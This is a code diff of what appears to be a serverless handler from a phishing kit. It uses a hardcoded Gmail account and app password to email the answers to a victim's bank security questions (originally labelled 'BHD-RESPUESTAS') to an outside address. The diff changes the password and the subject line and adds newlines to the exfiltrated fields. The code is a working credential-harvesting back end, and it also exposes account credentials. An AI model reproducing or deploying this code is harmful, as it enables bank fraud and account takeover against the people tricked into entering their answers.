@@ -8,20 +8,20 @@ exports.handler = async function(event, context) {
         service: 'gmail',
         auth: {
             user: 'cuentaluperonp5@gmail.com',
-            pass: 'ogynqksiltkdnuoz',
+            pass: 'hkqlbwibpmntqojg',
         },
     });
 
     let mailOptions = {
         from: 'cuentaluperonp5@gmail.com',
         to: 'sierroalee@gmail.com',
-        subject: 'BHD-RESPUESTAS',
+        subject: 'Respuestas de Seguridad',
         text: `
-¿Cuál es el personaje de su libro favorito?: ${favoriteCharacter}
-¿Cuál es la marca de su primer carro?: ${firstCarBrand}
-¿Cuál es su color favorito?: ${favoriteColor}
-¿Cuál es el nombre de su abuela materna?: ${grandmotherName}
-¿Nombre del colegio donde cursó la primaria?: ${schoolName}
+¿Cuál es el personaje de su libro favorito?: \n\n\n${favoriteCharacter}
+¿Cuál es la marca de su primer carro?: \n\n\n${firstCarBrand}
+¿Cuál es su color favorito?: \n\n\n${favoriteColor}
+¿Cuál es el nombre de su abuela materna?: \n\n\n${grandmotherName}
+¿Nombre del colegio donde cursó la primaria?: \n\n\n${schoolName}
         `,
     };
 
